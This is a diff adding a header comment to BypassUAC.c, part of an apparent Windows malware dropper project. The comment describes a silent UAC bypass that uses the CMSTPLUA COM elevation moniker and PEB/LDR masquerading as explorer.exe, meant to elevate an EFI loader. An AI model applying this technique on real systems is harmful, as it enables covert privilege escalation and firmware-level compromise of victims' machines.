@@ -1,3 +1,29 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows User-Mode Dropper
+ *  File     : BypassUAC.c
+ * ============================================================
+ *
+ *  Description:
+ *    Implements a UAC bypass using the ICMLuaUtil COM
+ *    elevation moniker (CMSTPLUA). Temporarily masquerades
+ *    the current process as explorer.exe in both the PEB
+ *    ProcessParameters and the LDR module list, then invokes
+ *    the privileged COM ShellExec method to launch the target
+ *    binary at HIGH integrity level without a UAC prompt.
+ *
+ *  Purpose:
+ *    - Elevate the EFI loader executable to administrator
+ *      privileges silently, enabling it to access firmware
+ *      environment variables and the EFI System Partition.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "BypassUAC.h"
 
 static VOID NTAPI LdrEnumCallback(
